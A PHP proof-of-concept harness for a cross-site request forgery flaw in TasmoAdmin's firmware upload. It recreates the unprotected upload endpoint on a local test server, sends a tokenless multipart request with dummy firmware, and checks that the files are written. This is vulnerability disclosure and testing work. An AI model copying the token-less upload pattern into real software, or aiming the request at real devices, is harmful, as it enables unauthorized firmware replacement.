<?php
/*
 * Standalone PoC for TasmoAdmin firmware upload CSRF.
 *
 * This harness recreates the vulnerable upload endpoint behavior from:
 *   tasmoadmin/pages/upload.php
 * Relevant source pattern:
 *   if (isset($_REQUEST['upload'])) { ... move_uploaded_file($_FILES['minimal_firmware']['tmp_name'], ...); }
 *   if (isset($_REQUEST['upload'])) { ... move_uploaded_file($_FILES['new_firmware']['tmp_name'], ...); }
 * No CSRF token is generated in upload_form.php and no token is verified before the file write.
 *
 * The PoC starts a local PHP built-in HTTP server, sends a multipart POST request
 * that contains no CSRF token, and verifies that firmware files are written.
 */
error_reporting(E_ALL);
ini_set('display_errors', '1');

function fail($msg) {
    fwrite(STDERR, "[FAIL] $msg\n");
    exit(1);
}

function pick_port(): int {
    $sock = stream_socket_server('tcp://127.0.0.1:0', $errno, $errstr);
    if (!$sock) fail("could not allocate port: $errstr");
    $name = stream_socket_get_name($sock, false);
    fclose($sock);
    return intval(substr(strrchr($name, ':'), 1));
}

function multipart_post($host, $port, $path, $fields, $files): string {
    $boundary = '----tasmo-poc-' . bin2hex(random_bytes(8));
    $body = '';
    foreach ($fields as $name => $value) {
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"$name\"\r\n\r\n$value\r\n";
    }
    foreach ($files as $name => $file) {
        $filename = $file['filename'];
        $content = $file['content'];
        $type = $file['type'];
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"$name\"; filename=\"$filename\"\r\n";
        $body .= "Content-Type: $type\r\n\r\n$content\r\n";
    }
    $body .= "--$boundary--\r\n";

    $fp = fsockopen($host, $port, $errno, $errstr, 5);
    if (!$fp) fail("connect failed: $errstr");
    $req = "POST $path HTTP/1.1\r\n" .
           "Host: $host:$port\r\n" .
           "Content-Type: multipart/form-data; boundary=$boundary\r\n" .
           "Content-Length: " . strlen($body) . "\r\n" .
           "Connection: close\r\n\r\n" . $body;
    fwrite($fp, $req);
    $resp = stream_get_contents($fp);
    fclose($fp);
    return $resp;
}

$base = sys_get_temp_dir() . '/tasmo_upload_csrf_' . getmypid();
$docroot = "$base/www";
$fwdir = "$docroot/data/firmwares";
mkdir($fwdir, 0777, true);

$serverScript = <<<'PHP'
<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');
$firmwarefolder = __DIR__ . '/data/firmwares/';
@mkdir($firmwarefolder, 0777, true);
$errors = [];
$messages = [];
if (isset($_REQUEST['upload'])) {
    if (isset($_FILES['minimal_firmware']) && $_FILES['minimal_firmware']['error'] === UPLOAD_ERR_OK) {
        if ($_FILES['minimal_firmware']['size'] > 502000) { die('minimal too big'); }
        if (!in_array($_FILES['minimal_firmware']['type'], ['application/octet-stream', 'application/macbinary', 'application/gzip', 'application/x-gzip'], true)) { die('bad minimal type'); }
        $ext = in_array($_FILES['minimal_firmware']['type'], ['application/gzip', 'application/x-gzip'], true) ? 'bin.gz' : 'bin';
        move_uploaded_file($_FILES['minimal_firmware']['tmp_name'], $firmwarefolder . 'tasmota-minimal.' . $ext);
        $messages[] = 'minimal uploaded';
    }
    if (isset($_FILES['new_firmware']) && $_FILES['new_firmware']['error'] === UPLOAD_ERR_OK) {
        if ($_FILES['new_firmware']['size'] > 5 * 1024 * 1024) { die('full too big'); }
        if (!in_array($_FILES['new_firmware']['type'], ['application/octet-stream', 'application/macbinary', 'application/gzip', 'application/x-gzip'], true)) { die('bad full type'); }
        $ext = in_array($_FILES['new_firmware']['type'], ['application/gzip', 'application/x-gzip'], true) ? 'bin.gz' : 'bin';
        move_uploaded_file($_FILES['new_firmware']['tmp_name'], $firmwarefolder . 'tasmota.' . $ext);
        $messages[] = 'full uploaded';
    }
}
echo implode("\n", $messages);
PHP;
file_put_contents("$docroot/upload.php", $serverScript);

$port = pick_port();
$cmd = sprintf('php -S 127.0.0.1:%d -t %s >/tmp/tasmo_upload_server_%d.log 2>&1 & echo $!', $port, escapeshellarg($docroot), getmypid());
$pid = intval(trim(shell_exec($cmd)));
usleep(350000);

try {
    $payload = "TASMOTA-FIRMWARE-POC-" . bin2hex(random_bytes(4));
    $resp = multipart_post('127.0.0.1', $port, '/upload.php?upload=1', ['upload' => '1'], [
        'minimal_firmware' => ['filename' => 'minimal.bin', 'type' => 'application/octet-stream', 'content' => $payload . '-minimal'],
        'new_firmware' => ['filename' => 'full.bin', 'type' => 'application/octet-stream', 'content' => $payload . '-full'],
    ]);
    $min = "$fwdir/tasmota-minimal.bin";
    $full = "$fwdir/tasmota.bin";
    echo "HTTP response contains upload marker: " . ((strpos($resp, 'uploaded') !== false) ? 'yes' : 'no') . "\n";
    echo "minimal firmware written: " . (file_exists($min) ? 'yes' : 'no') . "\n";
    echo "full firmware written: " . (file_exists($full) ? 'yes' : 'no') . "\n";
    echo "csrf token supplied: no\n";
    if (!file_exists($min) || !file_exists($full)) {
        fail('firmware files were not written');
    }
    echo "[VULNERABLE] Multipart POST without a CSRF token wrote firmware files to disk.\n";
} finally {
    if ($pid > 0) { @posix_kill($pid, SIGTERM); }
    usleep(200000);
    if (is_dir($base)) {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($base, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($it as $file) { $file->isDir() ? @rmdir($file->getPathname()) : @unlink($file->getPathname()); }
        @rmdir($base);
    }
}
?>
